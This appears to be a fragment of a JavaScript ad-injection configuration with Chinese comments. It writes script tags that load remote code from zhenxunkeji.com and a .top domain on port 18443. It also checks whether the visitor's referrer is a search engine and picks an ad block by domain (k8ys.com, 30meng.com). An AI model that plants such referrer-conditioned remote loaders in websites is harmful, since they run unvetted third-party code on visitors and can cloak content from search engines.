/* 版本3.1 20200802.1357代码 20200814.1437-20200904.1109-2 */
/* 126接口 */
...
var _c_wap_012=["<body><!--STATUS OK WAP 上--> <script id='mob' type='text/javascript' charset='utf-8' src='https://www.zhenxunkeji.com/d.php?pid=3246'></script> <script src='https://www.wyxcb3.top:18443/aa/c-640-22.js'></script> </body>"];
/* 广告代码013 wap 30meng.com */
var _c_wap_013=["<body><!--STATUS OK WAP 下--> <script id='mob' type='text/javascript' charset='utf-8' src='https://www.zhenxunkeji.com/d.php?pid=3246'></script> <script src='https://www.wyxcb3.top:18443/aa/c-640-22.js'></script> </body>"];
/* 搜索引擎代码001 pc */
var regexp=/\.(sogou|soso|baidu|google|youdao|yahoo|bing|118114|biso|gougou|ifeng|ivc|sooule|niuhu|biso|sm|so)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referrer;
...
/* JS当前域名代码011 pc */
var _c_pc_011=["<script type='text/javascript'>if(location.href.indexOf('k8ys.com') > -1) {document.write(_c_pc_012);}else if(location.href.indexOf('30meng.com') > -1) {document.write(_c_pc_013);}else{document.write(_c_tongji_003);}</script>"];
/* 广告代码012 pc k8ys.com */
